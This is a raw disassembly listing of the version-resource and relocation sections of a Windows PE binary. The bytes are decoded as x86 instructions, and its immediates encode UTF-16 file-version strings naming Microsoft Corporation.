  40a4c8:	outs   dx,BYTE PTR ds:[esi]
  40a4c9:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a4cd:	add    BYTE PTR [edx+0x0],dh
  40a4d0:	jae    0x40a4d2
  40a4d2:	add    BYTE PTR [eax],al
  40a4d4:	data16 add BYTE PTR [ebx],ah
  40a4d7:	add    BYTE PTR [ecx],al
  40a4d9:	add    BYTE PTR [esi+0x0],al
  40a4dc:	imul   eax,DWORD PTR [eax],0x65006c
  40a4e2:	push   esi
  40a4e3:	add    BYTE PTR [ebp+0x0],ah
  40a4e6:	jb     0x40a4e8
  40a4e8:	jae    0x40a4ea
  40a4ea:	imul   eax,DWORD PTR [eax],0x6e006f
  40a4f0:	add    BYTE PTR [eax],al
  40a4f2:	add    BYTE PTR [eax],al
  40a4f4:	xor    DWORD PTR [eax],eax
  40a4f6:	xor    BYTE PTR [eax],al
  40a4f8:	add    BYTE PTR cs:[eax],dh
  40a4fb:	add    BYTE PTR [esi],ch
  40a4fd:	add    BYTE PTR [ecx],dh
  40a4ff:	add    BYTE PTR [eax],dh
  40a501:	add    BYTE PTR [edx],dh
  40a503:	add    BYTE PTR [eax+eax*1],dh
  40a506:	xor    BYTE PTR [eax],al
  40a508:	add    BYTE PTR cs:[ecx],dh
  40a50b:	add    BYTE PTR [esi],dh
  40a50d:	add    BYTE PTR [ebx],dh
  40a50f:	add    BYTE PTR [eax],bh
  40a511:	add    BYTE PTR [eax+eax*1],dh
  40a514:	and    BYTE PTR [eax],al
  40a516:	sub    BYTE PTR [eax],al
  40a518:	je     0x40a51a
  40a51a:	push   0x2e003100
  40a51f:	add    BYTE PTR [ecx],dh
  40a521:	add    BYTE PTR ds:0x37003000,dh
  40a527:	add    BYTE PTR [eax],dh
  40a529:	add    BYTE PTR [ecx],bh
  40a52b:	add    BYTE PTR ds:0x37003100,ch
  40a531:	add    BYTE PTR [eax],dh
  40a533:	add    BYTE PTR [eax],dh
  40a535:	add    BYTE PTR [ecx],ch
  40a537:	add    BYTE PTR [eax],al
  40a539:	add    BYTE PTR [eax],al
  40a53b:	add    BYTE PTR [edx],bh
  40a53d:	add    BYTE PTR ds:0x49000100,cl
  40a543:	add    BYTE PTR [esi+0x0],ch
  40a546:	je     0x40a548
  40a548:	add    BYTE PTR gs:[edx+0x0],dh
  40a54c:	outs   dx,BYTE PTR ds:[esi]
  40a54d:	add    BYTE PTR [ecx+0x0],ah
  40a550:	ins    BYTE PTR es:[edi],dx
  40a551:	add    BYTE PTR [esi+0x0],cl
  40a554:	popa   
  40a555:	add    BYTE PTR [ebp+0x0],ch
  40a558:	add    BYTE PTR gs:[eax],al
  40a55b:	add    BYTE PTR [ebp+0x0],dl
  40a55e:	dec    esi
  40a55f:	add    BYTE PTR [eax+eax*1+0x4f],cl
  40a563:	add    BYTE PTR [eax+eax*1+0x43],al
  40a567:	add    BYTE PTR [eax+eax*1+0x52],dl
  40a56b:	add    BYTE PTR [esi],ch
  40a56d:	add    BYTE PTR [ebp+0x0],al
  40a570:	pop    eax
  40a571:	add    BYTE PTR [ebp+0x0],al
  40a574:	add    BYTE PTR [eax],al
  40a576:	add    BYTE PTR [eax],al
  40a578:	add    BYTE PTR [eax],0x2e
  40a57b:	add    BYTE PTR [ecx],al
  40a57d:	add    BYTE PTR [eax+eax*1+0x65],cl
  40a581:	add    BYTE PTR [edi+0x0],ah
  40a584:	popa   
  40a585:	add    BYTE PTR [eax+eax*1+0x43],ch
  40a589:	add    BYTE PTR [edi+0x0],ch
  40a58c:	jo     0x40a58e
  40a58e:	jns    0x40a590
  40a590:	jb     0x40a592
  40a592:	imul   eax,DWORD PTR [eax],0x680067
  40a598:	je     0x40a59a
  40a59a:	add    BYTE PTR [eax],al
  40a59c:	test   eax,0x4d002000
  40a5a1:	add    BYTE PTR [ecx+0x0],ch
  40a5a4:	arpl   WORD PTR [eax],ax
  40a5a6:	jb     0x40a5a8
  40a5a8:	outs   dx,DWORD PTR ds:[esi]
  40a5a9:	add    BYTE PTR [ebx+0x0],dh
  40a5ac:	outs   dx,DWORD PTR ds:[esi]
  40a5ad:	add    BYTE PTR [esi+0x0],ah
  40a5b0:	je     0x40a5b2
  40a5b2:	and    BYTE PTR [eax],al
  40a5b4:	inc    ebx
  40a5b5:	add    BYTE PTR [edi+0x0],ch
  40a5b8:	jb     0x40a5ba
  40a5ba:	jo     0x40a5bc
  40a5bc:	outs   dx,DWORD PTR ds:[esi]
  40a5bd:	add    BYTE PTR [edx+0x0],dh
  40a5c0:	popa   
  40a5c1:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a5c5:	add    BYTE PTR [edi+0x0],ch
  40a5c8:	outs   dx,BYTE PTR ds:[esi]
  40a5c9:	add    BYTE PTR [esi],ch
  40a5cb:	add    BYTE PTR [eax],ah
  40a5cd:	add    BYTE PTR [ecx+0x0],al
  40a5d0:	ins    BYTE PTR es:[edi],dx
  40a5d1:	add    BYTE PTR [eax+eax*1+0x20],ch
  40a5d5:	add    BYTE PTR [edx+0x0],dh
  40a5d8:	imul   eax,DWORD PTR [eax],0x680067
  40a5de:	je     0x40a5e0
  40a5e0:	jae    0x40a5e2
  40a5e2:	and    BYTE PTR [eax],al
  40a5e4:	jb     0x40a5e6
  40a5e6:	add    BYTE PTR gs:[ebx+0x0],dh
  40a5ea:	add    BYTE PTR gs:[edx+0x0],dh
  40a5ee:	jbe    0x40a5f0
  40a5f0:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40a5f5:	add    BYTE PTR [eax],al
  40a5f7:	add    BYTE PTR [edx+0x0],al
  40a5fa:	or     eax,0x4f000100
  40a5ff:	add    BYTE PTR [edx+0x0],dh
  40a602:	imul   eax,DWORD PTR [eax],0x690067
  40a608:	outs   dx,BYTE PTR ds:[esi]
  40a609:	add    BYTE PTR [ecx+0x0],ah
  40a60c:	ins    BYTE PTR es:[edi],dx
  40a60d:	add    BYTE PTR [esi+0x0],al
  40a610:	imul   eax,DWORD PTR [eax],0x65006c
  40a616:	outs   dx,BYTE PTR ds:[esi]
  40a617:	add    BYTE PTR [ecx+0x0],ah
  40a61a:	ins    DWORD PTR es:[edi],dx
  40a61b:	add    BYTE PTR [ebp+0x0],ah
  40a61e:	add    BYTE PTR [eax],al
  40a620:	push   ebp
  40a621:	add    BYTE PTR [esi+0x0],cl
  40a624:	dec    esp
  40a625:	add    BYTE PTR [edi+0x0],cl
  40a628:	inc    esp
  40a629:	add    BYTE PTR [ebx+0x0],al
  40a62c:	push   esp
  40a62d:	add    BYTE PTR [edx+0x0],dl
  40a630:	add    BYTE PTR cs:[ebp+0x0],al
  40a634:	pop    eax
  40a635:	add    BYTE PTR [ebp+0x0],al
  40a638:	add    BYTE PTR [eax],al
  40a63a:	add    BYTE PTR [eax],al
  40a63c:	push   0x0
  40a63e:	and    eax,0x50000100
  40a643:	add    BYTE PTR [edx+0x0],dh
  40a646:	outs   dx,DWORD PTR ds:[esi]
  40a647:	add    BYTE PTR [eax+eax*1+0x75],ah
  40a64b:	add    BYTE PTR [ebx+0x0],ah
  40a64e:	je     0x40a650
  40a650:	dec    esi
  40a651:	add    BYTE PTR [ecx+0x0],ah
  40a654:	ins    DWORD PTR es:[edi],dx
  40a655:	add    BYTE PTR [ebp+0x0],ah
  40a658:	add    BYTE PTR [eax],al
  40a65a:	add    BYTE PTR [eax],al
  40a65c:	dec    ebp
  40a65d:	add    BYTE PTR [ecx+0x0],ch
  40a660:	arpl   WORD PTR [eax],ax
  40a662:	jb     0x40a664
  40a664:	outs   dx,DWORD PTR ds:[esi]
  40a665:	add    BYTE PTR [ebx+0x0],dh
  40a668:	outs   dx,DWORD PTR ds:[esi]
  40a669:	add    BYTE PTR [esi+0x0],ah
  40a66c:	je     0x40a66e
  40a66e:	scas   al,BYTE PTR es:[edi]
  40a66f:	add    BYTE PTR [eax],ah
  40a671:	add    BYTE PTR [edi+0x0],dl
  40a674:	imul   eax,DWORD PTR [eax],0x64006e
  40a67a:	outs   dx,DWORD PTR ds:[esi]
  40a67b:	add    BYTE PTR [edi+0x0],dh
  40a67e:	jae    0x40a680
  40a680:	scas   al,BYTE PTR es:[edi]
  40a681:	add    BYTE PTR [eax],ah
  40a683:	add    BYTE PTR [edi+0x0],cl
  40a686:	jo     0x40a688
  40a688:	add    BYTE PTR gs:[edx+0x0],dh
  40a68c:	popa   
  40a68d:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a691:	add    BYTE PTR [esi+0x0],ch
  40a694:	add    BYTE PTR [bx+si],ah
  40a697:	add    BYTE PTR [ebx+0x0],dl
  40a69a:	jns    0x40a69c
  40a69c:	jae    0x40a69e
  40a69e:	je     0x40a6a0
  40a6a0:	add    BYTE PTR gs:[ebp+0x0],ch
  40a6a4:	add    BYTE PTR [eax],al
  40a6a6:	add    BYTE PTR [eax],al
  40a6a8:	inc    esi
  40a6a9:	add    BYTE PTR [ecx],dl
  40a6ab:	add    BYTE PTR [ecx],al
  40a6ad:	add    BYTE PTR [eax+0x0],dl
  40a6b0:	jb     0x40a6b2
  40a6b2:	outs   dx,DWORD PTR ds:[esi]
  40a6b3:	add    BYTE PTR [eax+eax*1+0x75],ah
  40a6b7:	add    BYTE PTR [ebx+0x0],ah
  40a6ba:	je     0x40a6bc
  40a6bc:	push   esi
  40a6bd:	add    BYTE PTR [ebp+0x0],ah
  40a6c0:	jb     0x40a6c2
  40a6c2:	jae    0x40a6c4
  40a6c4:	imul   eax,DWORD PTR [eax],0x6e006f
  40a6ca:	add    BYTE PTR [eax],al
  40a6cc:	xor    DWORD PTR [eax],eax
  40a6ce:	xor    BYTE PTR [eax],al
  40a6d0:	add    BYTE PTR cs:[eax],dh
  40a6d3:	add    BYTE PTR [esi],ch
  40a6d5:	add    BYTE PTR [ecx],dh
  40a6d7:	add    BYTE PTR [eax],dh
  40a6d9:	add    BYTE PTR [edx],dh
  40a6db:	add    BYTE PTR [eax+eax*1],dh
  40a6de:	xor    BYTE PTR [eax],al
  40a6e0:	add    BYTE PTR cs:[ecx],dh
  40a6e3:	add    BYTE PTR [esi],dh
  40a6e5:	add    BYTE PTR [ebx],dh
  40a6e7:	add    BYTE PTR [eax],bh
  40a6e9:	add    BYTE PTR [eax+eax*1],dh
  40a6ec:	add    BYTE PTR [eax],al
  40a6ee:	add    BYTE PTR [eax],al
  40a6f0:	inc    esp
  40a6f1:	add    BYTE PTR [eax],al
  40a6f3:	add    BYTE PTR [ecx],al
  40a6f5:	add    BYTE PTR [esi+0x0],dl
  40a6f8:	popa   
  40a6f9:	add    BYTE PTR [edx+0x0],dh
  40a6fc:	inc    esi
  40a6fd:	add    BYTE PTR [ecx+0x0],ch
  40a700:	ins    BYTE PTR es:[edi],dx
  40a701:	add    BYTE PTR [ebp+0x0],ah
  40a704:	dec    ecx
  40a705:	add    BYTE PTR [esi+0x0],ch
  40a708:	data16 add BYTE PTR [edi+0x0],ch
  40a70c:	add    BYTE PTR [eax],al
  40a70e:	add    BYTE PTR [eax],al
  40a710:	and    al,0x0
  40a712:	add    al,0x0
  40a714:	add    BYTE PTR [eax],al
  40a716:	push   esp
  40a717:	add    BYTE PTR [edx+0x0],dh
  40a71a:	popa   
  40a71b:	add    BYTE PTR [esi+0x0],ch
  40a71e:	jae    0x40a720
  40a720:	ins    BYTE PTR es:[edi],dx
  40a721:	add    BYTE PTR [ecx+0x0],ah
  40a724:	je     0x40a726
  40a726:	imul   eax,DWORD PTR [eax],0x6e006f
  40a72c:	add    BYTE PTR [eax],al
  40a72e:	add    BYTE PTR [eax],al
  40a730:	or     DWORD PTR [eax+esi*4],eax
  40a733:	add    al,0x0
  40a735:	add    BYTE PTR [eax],al
  40a737:	add    ch,cl
  40a739:	dec    ch
  40a73b:	dec    al
  40a73d:	add    BYTE PTR [eax],al
  40a73f:	add    BYTE PTR [eax],al
  40a741:	add    BYTE PTR [ecx],al
  40a743:	add    BYTE PTR [eax],al
  40a745:	add    BYTE PTR [eax],al
  40a747:	add    BYTE PTR [ecx],dl
  40a749:	add    BYTE PTR [eax],al
  40a74b:	add    BYTE PTR [eax],al
  40a74d:	add    BYTE PTR [eax],al
  40a74f:	add    BYTE PTR [edx],al
  40a751:	add    BYTE PTR [eax],al
  40a753:	add    BYTE PTR [ecx-0x56a63669],ch
  40a759:	leave  
  40a75a:	dec    ebp
  40a75b:	sar    DWORD PTR [eax+ebx*2],1
  40a75e:	mov    al,0xfe
  40a760:	add    al,0xa5
  40a762:	rep stos DWORD PTR es:[edi],eax
  40a764:	pop    es
  40a765:	out    0xfb,eax
  40a767:	daa    
  40a768:	in     eax,dx
  40a769:	cmp    DWORD PTR [ecx],0x10
  40a76c:	(bad)  
  40a76d:	rcr    al,1
  40a76f:	push   0xe3a83aae
	...
  40a78c:	mov    BYTE PTR [eax],al
  40a78e:	add    BYTE PTR [eax],al
  40a790:	push   cs
  40a791:	add    BYTE PTR [eax],al
  40a793:	add    BYTE PTR [eax+0x8000000],bl
  40a799:	add    BYTE PTR [eax],al
  40a79b:	add    BYTE PTR [eax+0xe000000],ah
  40a7a1:	add    BYTE PTR [eax],al
  40a7a3:	add    BYTE PTR [eax+0x8000000],dh
	...
  40a7b1:	add    BYTE PTR [eax],al
  40a7b3:	add    BYTE PTR [eax+0xc000000],bh
  40a7b9:	add    BYTE PTR [eax],al
  40a7bb:	add    BYTE PTR [eax],al
  40a7bd:	add    BYTE PTR [eax],al
  40a7bf:	add    BYTE PTR [ebp+0x0],cl
  40a7c2:	push   ebp
  40a7c3:	add    BYTE PTR [ecx+0x0],cl
	...
  40a7ce:	add    BYTE PTR [eax],al
  40a7d0:	adc    BYTE PTR [eax],al
  40a7d2:	add    BYTE PTR [eax],al
  40a7d4:	sbb    BYTE PTR [eax],al
  40a7d6:	add    BYTE PTR [eax],al
  40a7d8:	dec    ebp
  40a7d9:	add    BYTE PTR [ebp+0x0],dl
  40a7dc:	dec    ecx
	...
  40a7e5:	add    BYTE PTR [eax],al
  40a7e7:	add    BYTE PTR [esi],al
  40a7e9:	add    BYTE PTR [eax],al
  40a7eb:	add    BYTE PTR [eax],dl
  40a7ed:	add    BYTE PTR [eax],al
  40a7ef:	add    BYTE PTR [ebp+0x0],ah
  40a7f2:	outs   dx,BYTE PTR ds:[esi]
  40a7f3:	add    BYTE PTR ds:0x53005500,ch
  40a7f9:	add    BYTE PTR [eax],al
  40a7fb:	add    BYTE PTR [eax],al
  40a7fd:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040b000 <.reloc>:
  40b000:	add    BYTE PTR [eax],dl
  40b002:	add    BYTE PTR [eax],al
  40b004:	adc    al,0x0
  40b006:	add    BYTE PTR [eax],al
  40b008:	add    al,0x30
  40b00a:	adc    BYTE PTR [eax],dh
  40b00c:	adc    al,0x30
  40b00e:	push   eax
  40b00f:	xor    BYTE PTR [eax+esi*1+0x0],dl
  40b013:	add    BYTE PTR [eax],al
  40b015:	and    BYTE PTR [eax],al
  40b017:	add    BYTE PTR [ecx+eax*1],al
  40b01a:	add    BYTE PTR [eax],al
  40b01c:	mov    al,0x39
  40b01e:	mov    ah,0x39
  40b020:	sar    BYTE PTR [ecx],0xc4
  40b023:	cmp    eax,edx
  40b025:	cmp    esp,edx
  40b027:	cmp    eax,esp
  40b029:	cmp    esp,esp
  40b02b:	cmp    eax,esi
  40b02d:	cmp    esp,esi
  40b02f:	cmp    DWORD PTR [eax],eax
  40b031:	cmp    al,BYTE PTR [edx+edi*1]
  40b034:	adc    BYTE PTR [edx],bh
  40b036:	adc    al,0x3a
  40b038:	and    BYTE PTR [edx],bh
  40b03a:	and    al,0x3a
  40b03c:	xor    BYTE PTR [edx],bh
  40b03e:	xor    al,0x3a
  40b040:	inc    eax
  40b041:	cmp    al,BYTE PTR [edx+edi*1+0x50]
  40b045:	cmp    dl,BYTE PTR [edx+edi*1+0x60]
  40b049:	cmp    ah,BYTE PTR [edx+edi*1+0x70]
  40b04d:	cmp    dh,BYTE PTR [edx+edi*1-0x80]
  40b051:	cmp    al,BYTE PTR [edx+edi*1+0x3a943a90]
  40b058:	mov    al,ds:0xb03aa43a
  40b05d:	cmp    dh,BYTE PTR [edx+edi*1+0x3ac43ac0]
  40b064:	sar    BYTE PTR [edx],1
  40b066:	aam    0x3a
  40b068:	loopne 0x40b0a4
  40b06a:	in     al,0x3a
  40b06c:	lock cmp dh,ah
  40b06f:	cmp    al,BYTE PTR [eax]
  40b071:	cmp    eax,DWORD PTR [ebx+edi*1]
  40b074:	adc    BYTE PTR [ebx],bh
  40b076:	adc    al,0x3b
  40b078:	and    BYTE PTR [ebx],bh
  40b07a:	and    al,0x3b
  40b07c:	xor    BYTE PTR [ebx],bh
  40b07e:	xor    al,0x3b
  40b080:	inc    eax
  40b081:	cmp    eax,DWORD PTR [ebx+edi*1+0x50]
  40b085:	cmp    edx,DWORD PTR [ebx+edi*1+0x60]
  40b089:	cmp    esp,DWORD PTR [ebx+edi*1+0x70]
  40b08d:	cmp    esi,DWORD PTR [ebx+edi*1-0x80]
  40b091:	cmp    eax,DWORD PTR [ebx+edi*1+0x3b943b90]
  40b098:	mov    al,ds:0xb03ba43b
  40b09d:	cmp    esi,DWORD PTR [ebx+edi*1+0x3bc43bc0]
  40b0a4:	sar    BYTE PTR [ebx],1
  40b0a6:	aam    0x3b
  40b0a8:	loopne 0x40b0e5
  40b0aa:	in     al,0x3b
  40b0ac:	lock cmp esi,esp
  40b0af:	cmp    eax,DWORD PTR [eax]
  40b0b1:	cmp    al,0x4
  40b0b3:	cmp    al,0x10
  40b0b5:	cmp    al,0x14
  40b0b7:	cmp    al,0x20
  40b0b9:	cmp    al,0x24
  40b0bb:	cmp    al,0x30
  40b0bd:	cmp    al,0x34
  40b0bf:	cmp    al,0x40
  40b0c1:	cmp    al,0x44
  40b0c3:	cmp    al,0x50
  40b0c5:	cmp    al,0x54
  40b0c7:	cmp    al,0x60
  40b0c9:	cmp    al,0x64
  40b0cb:	cmp    al,0x70
  40b0cd:	cmp    al,0x74
  40b0cf:	cmp    al,0x80
  40b0d1:	cmp    al,0x84
  40b0d3:	cmp    al,0x90
  40b0d5:	cmp    al,0x94
  40b0d7:	cmp    al,0xa0
  40b0d9:	cmp    al,0xa4
  40b0db:	cmp    al,0xb0
  40b0dd:	cmp    al,0xb4
  40b0df:	cmp    al,0xc0
  40b0e1:	cmp    al,0xc4
  40b0e3:	cmp    al,0xd0
  40b0e5:	cmp    al,0xd4
  40b0e7:	cmp    al,0xe0
  40b0e9:	cmp    al,0xe4
  40b0eb:	cmp    al,0xf0
  40b0ed:	cmp    al,0xf4
  40b0ef:	cmp    al,0x0
  40b0f1:	cmp    eax,0x3d103d04
  40b0f6:	adc    al,0x3d
  40b0f8:	and    BYTE PTR ds:0x3d303d24,bh
  40b0fe:	xor    al,0x3d
  40b100:	inc    eax
  40b101:	cmp    eax,0x3d503d44
  40b106:	push   esp
  40b107:	cmp    eax,0x3d643d60
  40b10c:	jo     0x40b14b
  40b10e:	je     0x40b14d
  40b110:	hlt    
  40b111:	ds clc 
  40b113:	add    BYTE PTR ds:[edi],bh
  40b116:	or     BYTE PTR [edi],bh
  40b118:	add    BYTE PTR [eax],dh
  40b11a:	add    BYTE PTR [eax],al
  40b11c:	mov    al,ds:0x69000000
  40b121:	xor    edi,eax
  40b123:	xor    cl,ch
  40b125:	xor    bl,al
  40b127:	xor    bl,ch
  40b129:	xor    ah,dl
  40b12b:	xor    ah,bh
  40b12d:	xor    ch,ch
  40b12f:	xor    bh,bl
  40b131:	xor    al,BYTE PTR [ebx]
  40b133:	xor    edx,DWORD PTR [eax]
  40b135:	xor    edx,DWORD PTR [esi]
  40b137:	xor    ebx,DWORD PTR ds:0x69333133
  40b13d:	xor    edi,DWORD PTR [ecx-0x37cc40cd]
  40b143:	xor    ebp,ecx
  40b145:	xor    ebx,DWORD PTR [edx]
  40b147:	xor    al,0x3a
  40b149:	xor    al,0x58
  40b14b:	xor    al,0x67
  40b14d:	xor    al,0x7c
  40b14f:	xor    al,0x9e
  40b151:	xor    al,0xa9
  40b153:	xor    al,0xaf
  40b155:	xor    al,0xb6
  40b157:	xor    al,0xe0
  40b159:	xor    al,0xf0
  40b15b:	xor    al,0xc
  40b15d:	xor    eax,0x35783550
  40b162:	test   DWORD PTR ds:0x35fc35d2,esi
  40b168:	inc    edx
  40b169:	ss dec esi
  40b16b:	ss pop esp
  40b16d:	ss ja  0x40b1a6
  40b170:	mov    ah,0x36
  40b172:	add    al,0x37
  40b174:	dec    ebx
  40b175:	aaa    
  40b176:	push   esi
  40b177:	aaa    
  40b178:	data16 aaa 
  40b17a:	shl    BYTE PTR [edi],0x1c
  40b17d:	cmp    BYTE PTR [ebp+0x38],ch
  40b180:	jp     0x40b1ba
  40b182:	lahf   
  40b183:	cmp    BYTE PTR [edi+0x39],ch
  40b186:	jbe    0x40b1c1
  40b188:	jg     0x40b1c3
  40b18a:	test   DWORD PTR [ecx],edi
  40b18c:	lea    edi,[ecx]
  40b18e:	aas    
  40b18f:	cmp    al,BYTE PTR [esi+0x3a]
  40b192:	fnstcw WORD PTR [ecx+ebp*8]
  40b195:	cmp    al,0x1a
  40b197:	cmp    eax,0x3d883d21
  40b19c:	xchg   esi,eax
  40b19d:	cmp    eax,0x3dea3db6
  40b1a2:	icebp  
  40b1a3:	cmp    eax,0x3e2f3e25
  40b1a8:	pop    ecx
  40b1a9:	ds fwait
  40b1ab:	mov    ds:0xef3ed63e,al
  40b1b1:	adc    BYTE PTR ds:[edi],bh
  40b1b4:	pop    ss
  40b1b5:	aas    
  40b1b6:	dec    ecx
  40b1b7:	aas    
  40b1b8:	add    BYTE PTR [eax+0x0],al
  40b1bb:	add    ah,cl
  40b1bd:	add    BYTE PTR [eax],al
  40b1bf:	add    BYTE PTR [esi],cl
  40b1c1:	xor    BYTE PTR [edx],ch
  40b1c3:	xor    DWORD PTR [ecx+0x33],edx
  40b1c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c7:	xor    edi,DWORD PTR [edx+0x4f373e33]
  40b1cd:	aaa    
  40b1ce:	pop    ecx
  40b1cf:	aaa    
  40b1d0:	pop    edi
  40b1d1:	aaa    
  40b1d2:	data16 aaa 
  40b1d4:	outs   dx,BYTE PTR ds:[esi]
  40b1d5:	aaa    
  40b1d6:	lea    esi,[edi]
  40b1d8:	mov    edx,0xf380837
  40b1dd:	cmp    BYTE PTR [edi],dl
  40b1df:	cmp    BYTE PTR [ecx],ch
  40b1e1:	cmp    BYTE PTR [ebx+0x38],al
  40b1e4:	dec    ecx
  40b1e5:	cmp    BYTE PTR [ebp+0x38],ah
  40b1e8:	mov    ?,WORD PTR [eax]
  40b1ea:	stos   DWORD PTR es:[edi],eax
  40b1eb:	cmp    BYTE PTR [esi-0x23c73cc8],dh
  40b1f1:	cmp    BYTE PTR [edx],ch
  40b1f3:	cmp    DWORD PTR [ecx+edi*1+0x53],ecx
  40b1f7:	cmp    DWORD PTR [esi-0x61c66ec7],eax
  40b1fd:	cmp    DWORD PTR [esi-0x1ec62bc7],esi
  40b203:	cmp    DWORD PTR [edx],eax
  40b205:	cmp    cl,BYTE PTR [ecx]
  40b207:	cmp    bl,BYTE PTR [edx]
  40b209:	cmp    ch,BYTE PTR [ecx+0x3a]
  40b20c:	test   DWORD PTR [edx],edi
  40b20e:	mov    ?,WORD PTR [edx]
  40b210:	call   0xd63a:0xcb3aa83a
  40b217:	cmp    bl,ch
  40b219:	cmp    ah,bh
  40b21b:	cmp    dh,bh
  40b21d:	cmp    cl,BYTE PTR [esi]
  40b21f:	cmp    edx,DWORD PTR ds:0x723b3f3b
  40b225:	cmp    eax,DWORD PTR [ecx-0x6ac473c5]
  40b22b:	cmp    esp,DWORD PTR [ecx-0x27c442c5]
  40b231:	cmp    ecx,DWORD PTR ds:0x233c143c
  40b237:	cmp    al,0x39
  40b239:	cmp    al,0x3f
  40b23b:	cmp    al,0x55
  40b23d:	cmp    al,0x76
  40b23f:	cmp    al,0x9f
  40b241:	cmp    al,0xde
  40b243:	cmp    al,0xe5
  40b245:	cmp    al,0x22
  40b247:	cmp    eax,0x3d3f3d3a
  40b24c:	pop    eax
  40b24d:	cmp    eax,0x3d6e3d69
  40b252:	mov    edi,DWORD PTR ds:0x3dcc3db0
  40b258:	jmp    0x317edc9a
  40b25d:	cmp    DWORD PTR ds:[esi],0xffffff99
  40b261:	ds sahf 
  40b263:	sar    DWORD PTR ds:[esi],cl
  40b266:	fdivr  DWORD PTR [esi]
  40b268:	or     BYTE PTR [edi],bh
  40b26a:	push   cs
  40b26b:	aas    
  40b26c:	pop    ss
  40b26d:	aas    
  40b26e:	inc    esp
  40b26f:	aas    
  40b270:	dec    edx
  40b271:	aas    
  40b272:	pop    eax
  40b273:	aas    
  40b274:	jb     0x40b2b5
  40b276:	call   0xc53f:0xa43f9f3f
  40b27d:	aas    
  40b27e:	sar    BYTE PTR [edi],cl
  40b280:	in     al,dx
  40b281:	aas    
  40b282:	add    BYTE PTR [eax],al
  40b284:	add    BYTE PTR [eax+0x0],dl
  40b287:	add    BYTE PTR [ecx+eax*1],ah
  40b28a:	add    BYTE PTR [eax],al
  40b28c:	adc    al,0x30
  40b28e:	sbb    DWORD PTR [eax],esi
  40b290:	push   ds
  40b291:	xor    BYTE PTR [eax+esi*1],bh
  40b294:	inc    esp
  40b295:	xor    BYTE PTR [esi+0x30],cl
  40b298:	data16 xor BYTE PTR [ebp+0x30],ch
  40b29c:	jbe    0x40b2ce
  40b29e:	lahf   
  40b29f:	xor    bl,cl
  40b2a1:	xor    dl,dl
  40b2a3:	xor    BYTE PTR [eax],bl
  40b2a5:	xor    DWORD PTR [esi+0x31],ebp
  40b2a8:	cdq    
  40b2a9:	xor    ebp,edx
  40b2ab:	xor    ebp,ebp
  40b2ad:	xor    esi,esi
  40b2af:	xor    esp,edi
  40b2b1:	xor    DWORD PTR [eax],ecx
  40b2b3:	xor    cl,BYTE PTR ds:0x47324232
  40b2b9:	xor    dh,BYTE PTR [ebx+0x32]
  40b2bc:	xor    BYTE PTR [edx],0xb9
  40b2bf:	xor    cl,cl
  40b2c1:	xor    bl,al
  40b2c3:	xor    dl,BYTE PTR [edi]
  40b2c5:	xor    esi,DWORD PTR [ecx]
  40b2c7:	xor    ebx,DWORD PTR [eax+0x33]
  40b2ca:	pop    ebp
  40b2cb:	xor    esp,DWORD PTR [edx+0x33]
  40b2ce:	xor    BYTE PTR [ebx],0xb0
  40b2d1:	xor    esi,DWORD PTR [edi-0x31cc38cd]
  40b2d7:	xor    ebx,esi
  40b2d9:	xor    esp,ebp
  40b2db:	xor    ebp,ebp
  40b2dd:	xor    esi,esp
  40b2df:	xor    edi,ebp
  40b2e1:	xor    ebx,DWORD PTR [esp+esi*1]
  40b2e4:	pop    ebx
  40b2e5:	xor    al,0x62
  40b2e7:	xor    al,0x99
  40b2e9:	xor    al,0xe8
  40b2eb:	xor    al,0x13
  40b2ed:	xor    eax,0x357e353e
  40b2f2:	nop
  40b2f3:	xor    eax,0x35d735c7
  40b2f8:	out    0x35,al
  40b2fa:	pop    ds
  40b2fb:	ss inc eax
  40b2fd:	ss push edi
  40b2ff:	ss pop esp
  40b301:	mov    ss:0xe636bd36,eax
  40b307:	ss jmp 0x40b340
  40b30a:	lock adc esi,DWORD PTR ss:[edi]
  40b30e:	pop    ds
  40b30f:	aaa    
  40b310:	push   eax
  40b311:	aaa    
  40b312:	push   ebp
  40b313:	aaa    
  40b314:	mov    BYTE PTR [edi],dh
  40b316:	shl    BYTE PTR [edi],0xc5
  40b319:	aaa    
  40b31a:	hlt    
  40b31b:	aaa    
  40b31c:	sub    bh,BYTE PTR [eax]
  40b31e:	das    
  40b31f:	cmp    BYTE PTR [esi],bh
  40b321:	cmp    BYTE PTR [eax+edi*1+0x79],dh
  40b325:	cmp    BYTE PTR [ebx-0x39c73ec8],cl
  40b32b:	cmp    cl,dh
  40b32d:	cmp    BYTE PTR ds:0x3b393639,cl
  40b333:	cmp    DWORD PTR [eax+0x39],eax
  40b336:	popa   
  40b337:	cmp    DWORD PTR [edx+0x39],ebp
  40b33a:	xchg   edx,eax
  40b33b:	cmp    DWORD PTR [edi-0x41c646c7],edx
  40b341:	cmp    edx,esp
  40b343:	cmp    ecx,ebp
  40b345:	cmp    ecx,edi
  40b347:	cmp    DWORD PTR [eax],eax
  40b349:	cmp    dl,BYTE PTR [eax]
  40b34b:	cmp    dl,BYTE PTR [edi]
  40b34d:	cmp    bl,BYTE PTR [edi]
  40b34f:	cmp    ah,BYTE PTR [esi]
  40b351:	cmp    ch,BYTE PTR [edi]
  40b353:	cmp    cl,BYTE PTR [edx+edi*1+0x59]
  40b357:	cmp    ch,BYTE PTR [ebp+0x3a]
  40b35a:	mov    al,0x3a
  40b35c:	mov    bh,0x3a
  40b35e:	jmp    0x3a7bac9d
  40b363:	cmp    eax,DWORD PTR [ebx+0x3b]
  40b366:	dec    ecx
  40b367:	cmp    esp,DWORD PTR [edi+0x3b]
  40b36a:	sar    DWORD PTR [ebx],cl
  40b36c:	clc    
  40b36d:	cmp    edx,DWORD PTR [edi]
  40b36f:	cmp    al,0x34
  40b371:	cmp    al,0x4c
  40b373:	cmp    al,0x51
  40b375:	cmp    al,0x90
  40b377:	cmp    al,0xb9
  40b379:	cmp    al,0xe4
  40b37b:	cmp    al,0x1b
  40b37d:	cmp    eax,0x3d8b3d57
  40b382:	lds    edi,FWORD PTR ds:0x3e4a3dcc
  40b388:	push   eax
  40b389:	ds popa 
  40b38b:	ds push 0x3e
  40b38e:	ja     0x40b3ce
  40b390:	cmp    BYTE PTR [esi],0xe2
  40b393:	ds jmp 0x5f7fddd7
  40b399:	aas    
  40b39a:	gs aas 
